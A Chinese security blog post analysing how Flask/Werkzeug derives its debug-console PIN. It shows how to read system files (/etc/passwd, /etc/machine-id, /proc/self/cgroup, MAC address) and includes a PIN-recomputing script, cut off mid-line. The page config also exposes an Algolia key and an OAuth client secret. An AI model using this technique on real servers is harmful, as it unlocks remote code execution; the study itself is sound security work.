<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Flask debug模式下的PIN码安全性"><meta name="keywords" content=""><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>Flask debug模式下的PIN码安全性【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、概述"><span class="toc-number">1.</span> <span class="toc-text">一、概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、PIN码生成流程分析"><span class="toc-number">2.</span> <span class="toc-text">二、PIN码生成流程分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三、PIN码获取"><span class="toc-number">3.</span> <span class="toc-text">三、PIN码获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-liunx下PIN码获取"><span class="toc-number">3.1.</span> <span class="toc-text">1.liunx下PIN码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-window下PIN码获取"><span class="toc-number">3.2.</span> <span class="toc-text">2.window下PIN码获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四、例题"><span class="toc-number">4.</span> <span class="toc-text">四、例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-werkzeug-1-0-1-之前的版本"><span class="toc-number">4.1.</span> <span class="toc-text">1. werkzeug 1.0.1 之前的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#werkzeug-1-0-1-版本"><span class="toc-number">4.2.</span> <span class="toc-text">werkzeug 1.0.1 版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#五、总结"><span class="toc-number">5.</span> <span class="toc-text">五、总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">Flask debug模式下的PIN码安全性</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-07-29 | 更新于 2020-12-14</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>首发于先知社区<a href="https://xz.aliyun.com/t/8092" target="_blank" rel="noopener">https://xz.aliyun.com/t/8092</a></p>
<a id="more"></a>


<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>Flask 如果在生产环境中开启 debug模式，就会产生一个交互的shell,可以执行自定义的 python 代码。在较旧版本中是不用输入 PIN 码就可以执行代码，在新版本中需要输入一个 PIN 码。<br><img src="../../images/python/flask/debug/1.png" alt=""></p>
<p>在同一台机器上，多次重启Flask服务，PIN码值不改变，也就是说 PIN 码不是随机生成的，有一定的生成方法可循。接下来，我们来具体地分析一下 PIN 码的生成流程</p>
<p>本文章的分析都是基于python2.7的。 </p>
<h1 id="二、PIN码生成流程分析"><a href="#二、PIN码生成流程分析" class="headerlink" title="二、PIN码生成流程分析"></a>二、PIN码生成流程分析</h1><p>本次调试环境：</p>
<ul>
<li>python2.7 </li>
<li>window10</li>
<li>flask1.1.2  </li>
</ul>
<p>这里就使用pycharm进行调试。<br>示例代码如下，在app.run设置断点<br><img src="../../images/python/flask/debug/3.png" alt=""><br>按F7进入Flask类的run方法 ,<br>位置<code>python2.7\Lib\site-packages\flask\app.py(889~995)</code>，<br>这里都是一些变量的加载，不用理会，多次按F8直到run_simple()函数调用。<br><img src="../../images/python/flask/debug/4.png" alt=""><br>按F7进入run_simple(),位置<code>python2.7\Lib\site-packages\werkzeug\serving.py(876~971)</code>，这里判断了是否使用debug调试，有的话就调用DebuggedApplication类<br><img src="../../images/python/flask/debug/5.png" alt=""><br>按F7进入，位置<code>python2.7\Lib\site-packages\werkzeug\debug\__init__.py(220~498)</code>,从DebuggedApplication的<code>__init__</code>初始化操作中，有一个判断，如果启用PIN，及self.pin存在值，就会通过_log()函数，将PIN码打印到出来。<br><img src="../../images/python/flask/debug/6.png" alt=""><br>ctrl+鼠标左击进入self.pin，这里使用了@property装饰器，@property就是负责把一个方法变成属性调用的，方便定义属性的get和set方法。可以看到调用了get_pin_and_name()对PIN进行赋值。<br><img src="../../images/python/flask/debug/7.png" alt=""> </p>
<p>ctrl+鼠标左击进入get_pin_and_name()，位置<code>python2.7\Lib\site-packages\werkzeug\debug\__init__.py(137~217)</code>,这里就是生成PIN码的重点代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin_and_cookie_name</span><span class="params">(app)</span>:</span></span><br><span class="line">    <span class="string">"""Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    pin = os.environ.get(<span class="string">"WERKZEUG_DEBUG_PIN"</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">"off"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">"-"</span>, <span class="string">""</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"-"</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = getattr(app, <span class="string">"__module__"</span>, app.__class__.__module__)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">"__name__"</span>, app.__class__.__name__),</span><br><span class="line">        getattr(mod, <span class="string">"__file__"</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [str(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b"cookiesalt"</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">"__wzd"</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b"pinsalt"</span>)</span><br><span class="line">        num = (<span class="string">"%09d"</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">"-"</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">"0"</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
<p>首先初始化了三个变量，都为None,其中rv就是PIN的值，在分析过程中需要重点关注其值的变化。<br><img src="../../images/python/flask/debug/8.png" alt=""><br>因为PIN为None，所以第<code>150~159</code>的两个if不会执行，直接跳过。<br><img src="../../images/python/flask/debug/9.png" alt=""><br>接下来，也是一些有关PIN生成变量的赋值。</p>
<p><img src="../../images/python/flask/debug/10.png" alt=""><br>变量值赋值后的结果如下<br><img src="../../images/python/flask/debug/11.png" alt=""><br>然后再对probably_public_bits和private_bits列表的元素进行 md5.update,update 会将每次字符串拼接,相当于对probably_public_bits、private_bits的所有元素加上cookiesalt和pinsalt字符串进行拼接一个长字符串，对这个长字符串进行md5加密，生成一个MD5加密的值，取前9位，赋值给num。<br><img src="../../images/python/flask/debug/12.png" alt=""><br>最后将num的九位数的值分割成3个三位数，再用-连接3个三位数拼接，赋值给rv，这个rv就是PIN的值。<br><img src="../../images/python/flask/debug/13.png" alt=""><br>最后PIN的值如下<br><img src="../../images/python/flask/debug/14.png" alt=""> </p>
<h1 id="三、PIN码获取"><a href="#三、PIN码获取" class="headerlink" title="三、PIN码获取"></a>三、PIN码获取</h1><p>从如上的PIN的生成流程分析，可以知道PIN主要由probably_public_bits和private_bits两个列表变量决定，而这两个列表变量又由如下6个变量决定：    </p>
<ul>
<li>username 启动这个Flask的用户</li>
<li>modname 一般默认flask.app</li>
<li><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code> 一般默认flask.app为Flask</li>
<li><code>getattr(mod, &#39;__file__&#39;, None)</code>为flask目录下的一个app.py的绝对路径,可在爆错页面看到</li>
<li>str(uuid.getnode()) 则是网卡mac地址的十进制表达式</li>
<li>get_machine_id() 系统id</li>
</ul>
<p><img src="../../images/python/flask/debug/15.png" alt=""> </p>
<p>那又如何获取这6个变量呢？因为modname 一般默认flask.app，<code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code> 一般默认flask.app为Flask，所以主要获取剩下的4个变量即可。</p>
<h2 id="1-liunx下PIN码获取"><a href="#1-liunx下PIN码获取" class="headerlink" title="1.liunx下PIN码获取"></a>1.liunx下PIN码获取</h2><p>还是用上面流程分析的代码，在linux中运行。<br>(1). uaername 可以从/etc/passwd中读取。这里是root用户启动的，所以值为root，不知道哪个用户启动的，可以按照/etc/passwd里的用户多尝试一下。<br><img src="../../images/python/flask/debug/16.png" alt=""><br>(2). <code>getattr(mod, &#39;__file__&#39;, None)</code> flask目录下的一个app.py的绝对路径,这个值可以在报错页面看到。但有个需注意，python3是app.py，python2中是app.pyc。这里值为/usr/local/lib/python2.7/dist-packages/flask/app.pyc<br><img src="../../images/python/flask/debug/17.png" alt=""><br>(3). str(uuid.getnode()) MAC地址 读取这两个地址：/sys/class/net/eth0/address 或者 /sys/class/net/ens33/address.<br><img src="../../images/python/flask/debug/18.png" alt=""><br>转化为10进制，这里值为52228526895<br><img src="../../images/python/flask/debug/19.png" alt=""><br>(4). get_machine_id() 系统id 。<br>我们进入get_machine_id()，从代码中可以得知这里对linux、os、window的3种系统的获取方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_machine_id</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate</span><span class="params">()</span>:</span></span><br><span class="line">        linux = <span class="string">b""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">"/etc/machine-id"</span>, <span class="string">"/proc/sys/kernel/random/boot_id"</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">        <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/proc/self/cgroup"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b"/"</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X, use ioreg to get the computer's serial number.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">            <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">"ioreg"</span>, <span class="string">"-c"</span>, <span class="string">"IOPlatformExpertDevice"</span>, <span class="string">"-d"</span>, <span class="string">"2"</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b'"serial-number" = &lt;([^&gt;]+)'</span>, dump)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                wr = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(</span><br><span class="line">                    wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">"SOFTWARE\\Microsoft\\Cryptography"</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    wr.KEY_READ | wr.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    guid, guid_type = wr.QueryValueEx(rk, <span class="string">"MachineGuid"</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> guid_type == wr.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> guid.encode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> guid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> _machine_id</span><br></pre></td></tr></table></figure>
<p>只要从/etc/machine-id、/proc/sys/kernel/random/boot_id中读到一个值后立即break，然后和/proc/self/cgroup中的id值拼接<br><img src="../../images/python/flask/debug/20.png" alt="">   </p>
<p>2020.1.5对machine_id()进行了更新 ，所以2020.1.5之前的版本是跟这里不同的，具体更新情况可看<br><a href="https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f" target="_blank" rel="noopener">https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f</a>  </p>
<p>2020.1.5修改前是：<br>是依序读取/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id三个文件，只要读取到一个文件的内容，立马返回值。<br><img src="../../images/python/flask/debug/21.png" alt=""><br>这里/etc/machine-id 为75d03aa852be476cbe73544c93e98276 ，/proc/self/cgroup只读取第一行，并以从右边算起的第一个‘/’为分隔符，分成两部分，去右边那部分，这里为空，所以这里get_machine_id()的值为75d03aa852be476cbe73544c93e98276。<br><img src="../../images/python/flask/debug/22.png" alt=""> </p>
<p>现在已经知道所有变量的值，可以就用get_pin_and_cookie_name的部分代码生成PIN码。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'root'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'52228526895'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'75d03aa852be476cbe73544c93e98276'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span 